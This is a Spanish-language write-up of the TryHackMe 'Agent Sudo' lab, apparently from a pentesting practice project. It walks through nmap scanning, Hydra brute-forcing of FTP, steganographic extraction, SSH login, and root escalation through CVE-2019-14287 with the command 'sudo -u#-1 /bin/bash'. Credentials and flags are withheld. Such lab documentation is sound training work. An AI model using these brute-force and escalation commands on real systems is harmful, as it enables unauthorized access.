
# LAB-010 — EVIDENCIAS PÚBLICAS

**Proyecto:** FANTASMA — Pentesting & Red Team  
**Plataforma:** TryHackMe  
**Máquina:** Agent Sudo  
**Objetivo:** 10.67.163.128  
**Fecha de documentación:** 20/11/2026  
**Estado:** Laboratorio completado

---

## 01 — Reconocimiento de servicios

**Herramienta:** Nmap

Comando utilizado:

    nmap -sV -Pn 10.67.163.128

Servicios identificados:

| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.6p1 |
| 80/tcp | HTTP | Apache 2.4.29 |

**Evidencia:** Tres servicios TCP accesibles.

## 02 — Enumeración web

**Herramienta:** Curl

Comando:

    curl -L -A 'C' http://10.67.163.128

**Resultado observado:**

- La aplicación interpretaba la cabecera User-Agent.
- Se identificó al agente C como `chris`.
- Se obtuvo una pista sobre una contraseña débil.

**Evidencia:** Información revelada mediante una cabecera HTTP modificada.

## 03 — Acceso FTP

**Herramienta:** Hydra

Comando:

    hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 4 -f ftp://10.67.163.128

**Resultado observado:** Se encontró una contraseña válida para el usuario FTP.

Archivos identificados después de la autenticación:

- `To_agentJ.txt`
- `cutie.png`
- `cute-alien.jpg`

**Evidencia:** Acceso autenticado al servicio FTP y recuperación de archivos.

**Nota:** La contraseña recuperada no se publica.

## 04 — Análisis de cutie.png

**Herramientas:** Binwalk, 7-Zip y John the Ripper.

Comandos principales:

    binwalk cutie.png
    binwalk -e cutie.png

**Resultado observado:**

- Se detectó contenido ZIP incrustado en la imagen.
- El ZIP estaba protegido con contraseña.
- La contraseña pudo recuperarse mediante un ataque de diccionario.
- Se extrajo el documento `To_agentR.txt`.

**Evidencia:** Recuperación de información oculta en un archivo PNG.

## 05 — Decodificación Base64

**Herramienta:** base64

Comando:

    echo 'QXJlYTUx' | base64 -d

**Resultado observado:** Se recuperó una pista utilizada en la siguiente fase.

**Evidencia:** Identificación y decodificación de información codificada.

## 06 — Esteganografía

**Herramienta:** Stegseek

Comando:

    stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt

**Resultado observado:**

- Se identificó contenido oculto en la imagen.
- Se extrajo un mensaje de texto.
- El mensaje contenía credenciales para el acceso SSH.

**Evidencia:** Extracción de información mediante análisis esteganográfico.

**Nota:** No se publican las credenciales.

## 07 — Acceso inicial SSH

**Herramienta:** OpenSSH

Comando:

    ssh james@10.67.163.128

**Resultado observado:**

- Autenticación correcta del usuario `james`.
- Acceso a una terminal remota.
- Identificación del archivo `user_flag.txt`.
- Recuperación de la bandera de usuario.

**Evidencia:** Acceso inicial confirmado.

**Nota:** La bandera se mantiene fuera del repositorio público.

## 08 — Enumeración de privilegios

Comando:

    sudo -l

Resultado relevante:

    (ALL, !root) /bin/bash

Versión observada:

    Sudo version 1.8.21p2

**Evidencia:** Configuración sudo susceptible a CVE-2019-14287 en la versión instalada.

## 09 — Escalada de privilegios

**Vulnerabilidad:** CVE-2019-14287

Comando utilizado:

    sudo -u#-1 /bin/bash

Verificación:

    id

Resultado observado:

    uid=0(root) gid=1000(james) groups=1000(james)

**Evidencia:** Privilegios root confirmados mediante UID 0.

## 10 — Bandera final

**Archivo identificado:**

    /root/root.txt

**Resultado observado:** Recuperación de la bandera final del laboratorio.

**Nota:** El valor de la bandera no se publica.

## 11 — Resumen de resultados

| Fase | Resultado |
|---|---|
| Reconocimiento | Completado |
| Enumeración HTTP | Completada |
| Acceso FTP | Confirmado |
| Análisis de archivos | Completado |
| Recuperación de pistas | Completada |
| Esteganografía | Completada |
| Acceso SSH | Confirmado |
| Escalada de privilegios | Root confirmado |
| Bandera final | Recuperada |

## 12 — Seguridad de la documentación

Este archivo contiene únicamente información técnica seleccionada para publicación.

Se excluyen:

- Contraseñas y credenciales recuperadas.
- Banderas de TryHackMe.
- Archivos privados del laboratorio.
- Configuraciones VPN y claves.
- Datos personales y tokens de acceso.

Los resultados descritos corresponden a las pruebas realizadas en el entorno autorizado.

---

**FANTASMA — Pentesting & Red Team**  
**LAB-010 AGENT SUDO — Evidencias documentadas**
